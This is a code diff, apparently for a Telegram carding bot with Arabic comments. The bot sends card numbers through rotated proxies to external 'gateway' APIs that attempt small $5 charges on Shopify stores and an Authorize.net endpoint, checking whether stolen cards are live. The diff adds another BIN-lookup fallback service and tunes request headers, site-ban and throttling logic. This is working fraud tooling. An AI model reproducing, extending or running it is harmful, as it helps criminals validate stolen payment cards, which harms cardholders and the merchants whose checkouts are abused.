@@ -86,7 +86,7 @@ JOIN_GROUP_TARGET = get_valid_target(JOIN_GROUP_LINK, JOIN_GROUP_ID)
 HITS_GROUP_TARGET = get_valid_target(HITS_GROUP_LINK, HITS_GROUP_ID)
 
 # روابط الـ APIs النشطة
-SHOPIFY_API_URL_1 = 'https://shopy-kappa-nine.vercel.app/check'
+SHOPIFY_API_URL_1 = 'https://shopy-kappa-nine.vercel.app/'
 AUTHNET_API_URL = 'https://authnet-4b3p.vercel.app/calc'
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
 KEYS_FILE = "redeem_keys.json"
@@ -522,7 +522,6 @@ async def get_shopify_sites():
                     _LAST_SITES_FETCH = now
     except Exception: pass
     
-    # القائمة الاحتياطية المدمجة لـ شوبيفاي
     if not _CACHED_SHOPIFY_SITES:
         _CACHED_SHOPIFY_SITES = [
             "touch-of-finland.myshopify.com",
@@ -620,11 +619,9 @@ def clean_bin_data(data):
     country_name = str(data.get("country", "-")).upper().strip()
     country_code = str(data.get("country_code", data.get("country_iso", data.get("code", "")))).upper().strip()
     
-    # محاولة مطابقة كود الدولة إذا كان الاسم متاحاً فقط
     if not country_code and country_name != "-":
         country_code = COUNTRY_NAME_TO_CODE.get(country_name, "")
         
-    # تحويل الأكواد الثلاثية (مثل USA) إلى ثنائية (US) ليعمل العلم بشكل سليم
     if len(country_code) == 3:
         country_code = ISO3_TO_ISO2.get(country_code, country_code[:2])
         
@@ -648,44 +645,47 @@ async def get_bin_info(bin_code, session=None):
         return _BIN_CACHE[b6]
         
     headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "Accept": "application/json"
     }
     
+    # 1. محاولة جلب الـ BIN من موقع Antipublic
     try:
         url1 = f"https://bins.antipublic.cc/bins/{b6}"
         async def fetch1(s):
-            async with s.get(url1, headers=headers, timeout=4) as r:
+            async with s.get(url1, headers=headers, timeout=5) as r:
                 if r.status == 200:
                     data = await r.json()
                     if data and isinstance(data, dict): return data
                 return None
         
         res = await fetch1(session) if (session and not session.closed) else await fetch1(aiohttp.ClientSession())
-        if res:
+        if res and "country" in res:
             parsed = clean_bin_data({
                 "brand": res.get("brand", "-"),
                 "type": res.get("type", "-"),
                 "level": res.get("level", "-"),
                 "bank": res.get("bank", "-"),
-                "country": res.get("country", "-"),
-                "country_code": res.get("country_code") or res.get("country_iso") or res.get("code") or "",
+                "country": res.get("country_name", res.get("country", "-")),
+                "country_code": res.get("country_flag", res.get("country_code", res.get("country_iso", ""))),
                 "flag": res.get("flag", "")
             })
             _BIN_CACHE[b6] = parsed
             return parsed
     except Exception: pass
 
+    # 2. محاولة جلب الـ BIN من موقع HandyAPI (مع إصلاح خطأ الـ None)
     try:
         url2 = f"https://data.handyapi.com/bin/{b6}"
         async def fetch2(s):
-            async with s.get(url2, headers=headers, timeout=4) as r:
+            async with s.get(url2, headers=headers, timeout=5) as r:
                 if r.status == 200: return await r.json()
                 return None
                 
         res2 = await fetch2(session) if (session and not session.closed) else await fetch2(aiohttp.ClientSession())
         if res2 and res2.get("Status") == "SUCCESS":
-            country_obj = res2.get("Country", {})
-            bank_obj = res2.get("Bank", {})
+            country_obj = res2.get("Country") or {}
+            bank_obj = res2.get("Bank") or {}
             parsed = clean_bin_data({
                 "brand": res2.get("Scheme", "-"),
                 "type": res2.get("Type", "-"),
@@ -699,9 +699,35 @@ async def get_bin_info(bin_code, session=None):
             return parsed
     except Exception: pass
 
-    return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "", "flag": "🏳️"}
+    # 3. مصدر احتياطي إضافي (Binlist)
+    try:
+        url3 = f"https://lookup.binlist.net/{b6}"
+        async def fetch3(s):
+            async with s.get(url3, headers=headers, timeout=5) as r:
+                if r.status == 200: return await r.json()
+                return None
+                
+        res3 = await fetch3(session) if (session and not session.closed) else await fetch3(aiohttp.ClientSession())
+        if res3:
+            country_obj = res3.get("country") or {}
+            bank_obj = res3.get("bank") or {}
+            parsed = clean_bin_data({
+                "brand": res3.get("scheme", "-"),
+                "type": res3.get("type", "-"),
+                "level": res3.get("brand", "-"),
+                "bank": bank_obj.get("name", "-"),
+                "country": country_obj.get("name", "-"),
+                "country_code": country_obj.get("alpha2", ""),
+                "flag": ""
+            })
+            _BIN_CACHE[b6] = parsed
+            return parsed
+    except Exception: pass
 
-# ====================== SHOPIFY GATEWAY ENGINE (UPDATED FOR DYNAMIC PRICE & $5 LIMIT) ======================
+    # 4. إذا فشلت كل المواقع، ارجع القيمة الافتراضية
+    return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "Unknown", "country_code": "", "flag": "🌐"}
+
+# ====================== SHOPIFY GATEWAY ENGINE ======================
 async def check_shopify_api(api_url, card, site, proxy, session):
     try:
         proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
@@ -717,7 +743,6 @@ async def check_shopify_api(api_url, card, site, proxy, session):
         
         proxy_param = f"&proxy={quote(proxy_str)}" if proxy_str else "&proxy="
         
-        # تمرير قيم amount و amt و price محددة بـ 5 دولارات لتجنب سحب مبالغ كبيرة
         req_url = f"{api_url}?cc={card_encoded}&site={site_encoded}{proxy_param}&amount=5&amt=5&price=5"
         
         headers = {
@@ -734,13 +759,11 @@ async def check_shopify_api(api_url, card, site, proxy, session):
             if resp.status != 200:
                 return {'status': 'Site Error', 'message': f'API HTTP {resp.status}', 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
             
-            # محاولة قراءة استجابة السعر ديناميكيًا من الـ JSON أو الـ Regex
             try: 
                 rj = json.loads(text_data)
                 rm = str(rj.get('response_msg', rj.get('result', rj.get('Response', rj.get('message', rj.get('error', rj.get('msg', rj.get('status', '')))))))).strip()
                 gt = rj.get('Gateway', rj.get('gateway', 'Shopify'))
                 
-                # البحث الذكي عن مفتاح السعر
                 for k in ['Price', 'price', 'amount', 'Amount', 'amt', 'Amt', 'charged']:
                     if k in rj and rj[k]:
                         pr = str(rj[k]).strip()
@@ -748,10 +771,9 @@ async def check_shopify_api(api_url, card, site, proxy, session):
             except Exception: 
                 rm = text_data.strip()
             
-            # إذا لم نجد مفتاحاً صريحاً في الـ JSON، نستخلص السعر ديناميكياً من النص عبر الـ Regex
             if not pr:
                 price_match = re.search(r'\$\d+(?:\.\d{2})?', text_data)
-                pr = price_match.group(0) if price_match else "$5.00" # الاحتياطي هو 5 دولار التي طلبناها
+                pr = price_match.group(0) if price_match else "$5.00" 
             
             clean_rm = unsf(rm).lower()
             
@@ -780,13 +802,12 @@ async def check_shopify_api(api_url, card, site, proxy, session):
     except Exception as e: 
         return {'status': 'Site Error', 'message': f'API Error: {str(e)[:30]}', 'card': card, 'retry': True}
 
-# ====================== ASYNC AUTHNET GATEWAY ENGINE (UPDATED FOR DYNAMIC PRICE & $5 LIMIT) ======================
+# ====================== ASYNC AUTHNET GATEWAY ENGINE ======================
 async def check_authnet_api(card, proxy, session):
     try:
         proxy_url = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
         card = card.strip()
         
-        # تمرير قيم السعر لتجربة سحب 5 دولارات فقط
         req_url = f"{AUTHNET_API_URL}?cc={quote(card)}&amount=5&amt=5&price=5"
         headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
@@ -800,7 +821,6 @@ async def check_authnet_api(card, proxy, session):
                 rj = json.loads(text_data)
                 rm = str(rj.get('response_msg', rj.get('result', rj.get('Response', rj.get('message', rj.get('error', rj.get('msg', rj.get('status', text_data)))))))).strip()
                 
-                # البحث الذكي عن مفتاح السعر
                 for k in ['Price', 'price', 'amount', 'Amount', 'amt', 'Amt', 'charged']:
                     if k in rj and rj[k]:
                         pr = str(rj[k]).strip()
@@ -885,11 +905,10 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
                 
                 clean_msg = unsf(msg).lower()
                 
-                # حل ذكي وسريع لمشكلتي Site Error 404 و Requires Login لمنع تكرار الخطأ فوراً
                 if '404' in clean_msg or 'login' in clean_msg:
-                    _SITE_ERRORS_COUNT[s] = _MAX_SITE_ERRORS + 5 # حظر دائم وفوري للموقع التالف
+                    _SITE_ERRORS_COUNT[s] = _MAX_SITE_ERRORS + 5 
                     lr = r
-                    continue # إعادة المحاولة فوراً بموقع آخر سليم دون تضييع ثانية واحدة
+                    continue 
                 
                 if any(k in msg for k in ['proxy', 'tunnel', 'connection close', 'format error', 'max retries', 'bad gateway', 'timeout']):
                     if p_dict and p_dict in proxies:
@@ -1576,7 +1595,6 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                 if gate_name == "AuthNet":
                     await asyncio.sleep(0.3) 
                 else:
-                    # تسريع البوت ديناميكياً: تقليل وقت الانتظار بناءً على كمية البروكسيات المتوفرة لدى المستخدم لضمان سرعة قصوى
                     num_proxies = len(proxies)
                     if num_proxies >= 15:
                         await asyncio.sleep(random.uniform(0.3, 1.0))
